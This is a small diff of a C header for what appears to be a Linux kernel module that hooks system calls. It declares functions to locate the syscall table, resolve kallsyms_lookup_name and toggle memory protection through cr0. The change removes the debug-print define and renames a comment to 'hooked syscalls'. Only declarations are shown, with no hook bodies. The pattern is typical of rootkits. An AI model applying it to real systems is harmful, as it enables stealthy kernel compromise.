@@ -6,8 +6,6 @@ void protect_memory(unsigned long val);
 void get_kallsyms_funcptr(void);
 void get_syscall_table(void);
 
-#define DEBUG_PRINTS
-
 #ifdef DEBUG_PRINTS
     #define m_printd(fmt, ...) { printk(fmt, ##__VA_ARGS__); }
 #else
@@ -18,7 +16,8 @@ void get_syscall_table(void);
 extern unsigned long *syscall_table;
 // cr0 status
 extern unsigned long cr0;
-// Function pointer for read
+
+// Function pointer for hooked syscalls
 typedef int (*sysfun_t)(struct pt_regs *);
 
 // Function pointer for kallsyms_lookup_name
